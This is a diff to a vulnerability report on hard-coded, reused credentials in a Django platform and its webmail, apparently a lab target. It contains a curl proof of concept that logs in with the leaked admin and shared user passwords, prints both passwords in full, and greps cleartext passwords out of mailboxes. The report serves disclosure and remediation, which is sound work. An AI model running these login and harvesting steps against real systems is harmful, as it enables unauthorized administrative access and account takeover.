@@ -25,13 +25,13 @@ No authentication-bypass logic is needed. The vulnerability is that a valid priv
 | 1 | Obtain the source or container image (repository checkout, or `docker run`/`docker exec` on the image) and open `setup/setup_database.py` and `setup/setup_webmail.py`. | Admin password `X#9kLm$P2v@nQ8w!ZjRe` and shared user password `Tr@c3d!7BxN#m9Kw2YpL` are read in plaintext (`setup_database.py:41`, `setup_webmail.py:25`). |
 | 2 | Alternatively, read the setup console output (`setup_database.py:514-545`) from logs. | Same credentials, plus the admin API key, appear in the summary. |
 | 3 | Log in to the Django admin at `http://localhost:8000/admin/` as `admin` with `X#9kLm$P2v@nQ8w!ZjRe`. | Full Django admin access (all models, all users). |
-| 4 | Log in to `http://localhost:8000/account/login/` as `admin` with the same password. | Authenticated session with admin privileges on the main platform. |
-| 5 | Log in as any seeded user (e.g. `johndoe`) with `Tr@c3d!7BxN#m9Kw2YpL`. | Access to 14 accounts from one leaked password. |
-| 6 | Reuse the admin password on the webmail (`http://localhost:8088`). | Access to the admin mailbox. |
+| 4 | Log in to `http://localhost:8000/account/login/` as `admin` with the same password. | `302` to `/account/process/` (then `/account/ask-2fa`, because the seeded `admin` has no 2FA enrolled): authenticated session with admin privileges on the main platform. |
+| 5 | Log in as any seeded user (e.g. `johndoe`) with `Tr@c3d!7BxN#m9Kw2YpL`. | Access to 14 accounts from one leaked password (all 14 users in `users.csv` verified: `302` to `/account/process/`). |
+| 6 | Reuse the admin password on the webmail (`POST http://localhost:8088/connect`, fields `Ufield` / `Pfield`; the webmail login is the full address `admin@tbox.traced`). Seeded users log in the same way (e.g. `john.doe@tbox.traced` / `Tr@c3d!7BxN#m9Kw2YpL`). | `302` to `/client` with `Id` / `Username` cookies: access to the admin mailbox and to every seeded mailbox. |
 
 # PoC
 
-Harvest the credentials from source, then log in (the main login is documented in the dev catalog as `POST /account/login/`; field names `username` / `password` are assumed):
+Harvest the credentials from source, then log in (main login: `POST /account/login/` with fields `username` / `password`, which also accepts the e-mail address):
 
 ```bash
 # 1. Harvest credentials from the deployed source (no network access needed)
@@ -49,11 +49,11 @@ curl -s -b admin.cookies -c admin.cookies -X POST \
   --data-urlencode 'password=X#9kLm$P2v@nQ8w!ZjRe' \
   -H "Referer: http://localhost:8000/account/login/" \
   http://localhost:8000/account/login/
-# Expected: HTTP 302 to the dashboard
+# Observed: HTTP 302, Location: /account/process/ (which forwards to /account/ask-2fa)
 
 # 4. Confirm admin panel access with the same session
 curl -s -b admin.cookies -o /dev/null -w "%{http_code}\n" http://localhost:8000/admin/
-# Expected: 200 (admin site), not 302 to the admin login
+# Observed: 200 ("Site administration" page), not 302 to the admin login
 
 # 5. Log in as a seeded user with the shared default password
 curl -s -c user.cookies http://localhost:8000/account/login/ -o /dev/null
@@ -64,7 +64,19 @@ curl -s -b user.cookies -c user.cookies -X POST \
   --data-urlencode 'password=Tr@c3d!7BxN#m9Kw2YpL' \
   -H "Referer: http://localhost:8000/account/login/" \
   http://localhost:8000/account/login/
-# Expected: HTTP 302 (authenticated session)
+# Observed: HTTP 302, Location: /account/process/ (authenticated session)
+
+# 6. Reuse the admin password on the webmail (username is the full address)
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST \
+  --data-urlencode "Ufield=admin@tbox.traced" \
+  --data-urlencode 'Pfield=X#9kLm$P2v@nQ8w!ZjRe' \
+  http://localhost:8088/connect
+# Observed: 302 http://localhost:8088/client  (Id / Username cookies set)
+# Note: Ufield=admin returns "Unknown user."
+
+# 7. The cleartext password is also stored in each seeded mailbox (welcome e-mail)
+curl -s "http://localhost:8088/api/emails?user=john.doe" | grep -o 'Password: [^\\]*'
+# Observed: Password: Tr@c3d!7BxN#m9Kw2YpL
 ```
 
 # Risk
@@ -75,15 +87,20 @@ curl -s -b user.cookies -c user.cookies -X POST \
 | Integrity | Full administrative control of the platform: modify or delete any user or content, change configuration, and create stored-XSS articles (see M3). |
 | Availability | Admin access allows deleting users, accounts, or content, and disabling the service. |
 
-Overall severity: **Critical**. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8). The credentials are static and public to anyone who can read the repository or image, need no interaction, and grant full admin rights across three services. The password is reused for the admin site, main login, and webmail, which multiplies the blast radius.
+Overall severity: **Critical** — hard-coded, shared and exposed credentials significantly weaken authentication security and may compromise privileged accounts across affected services.
+
+CVSS 3.1: **9.8 (Critical)** — as recorded in the developer catalog, subject to confirmation of the documented attack prerequisites and impact metrics.
 
 # Remediation
 
-1. Remove all literal credentials from `setup/setup_database.py`, `setup/setup_webmail.py`, and `setup/users.csv`. Generate random passwords at setup time (e.g. `secrets.token_urlsafe(24)`) or require them as environment variables or from a secrets manager.
-2. Rotate the `admin` password and every seeded user password immediately, and invalidate existing sessions and API keys printed in the setup output.
-3. Stop printing credentials and API keys in the setup summary (`setup_database.py:514-545`) and stop emailing cleartext passwords (`setup_webmail.py:90-105`); send a one-time password-reset link instead.
-4. Exclude `setup/` and any secret-bearing files from the container image (`.dockerignore`, and avoid `COPY . .` of secrets in `Dockerfile:21`), and never reuse one password across services.
-5. Enforce a strong password policy, unique credentials per service, account lockout after repeated failures, and MFA on the admin account.
+1. **Remove hard-coded credentials** — remove literal passwords and shared default credentials from `setup/setup_database.py`, `setup/setup_webmail.py` and `setup/users.csv`. Use `secrets.token_urlsafe()` when random credentials are required, or retrieve provisioning secrets from a dedicated secrets manager.
+2. **Secure Docker secret management** — configure runtime secrets through Docker Compose `secrets` or an external secrets manager. Exclude secret-bearing files using `.dockerignore` and avoid embedding credentials in Dockerfile `ARG`, `ENV` instructions or image layers. Preserve only the secret-free setup scripts required for application initialisation.
+3. **Secure account provisioning** — separate development seed data from production account provisioning. Use Django's `set_password()` for password storage and `validate_password()` with `AUTH_PASSWORD_VALIDATORS` where applicable. Ensure that repeated setup execution cannot restore insecure default credentials.
+4. **Eliminate credential disclosure** — remove password and API key output from `setup/setup_database.py` and stop transmitting cleartext passwords through `send_welcome_email()` in `setup/setup_webmail.py`. Use secure, single-use, time-limited enrolment or password reset links.
+5. **Revoke exposed credentials** — rotate all affected passwords and API keys, invalidate existing sessions and exposed activation tokens, and require secure credential replacement across Django and TrackBox webmail.
+6. **Enforce secure authentication policies** — require unique credentials across independent services, enforce MFA for privileged accounts, apply server-side authentication rate limiting and reject commonly used or compromised passwords.
+7. **Remediate historical secret exposure** — review repository history, container images, setup logs, backups and historical emails for sensitive authentication material. Remove or restrict exposed artefacts according to incident response and retention requirements.
+8. **Add regression tests and secret scanning** — verify that setup scripts do not create shared default credentials, expose authentication secrets or reset existing credentials unexpectedly. Integrate secret detection into the CI/CD pipeline using a tool such as Gitleaks.
 
 # Author
 WOCSA
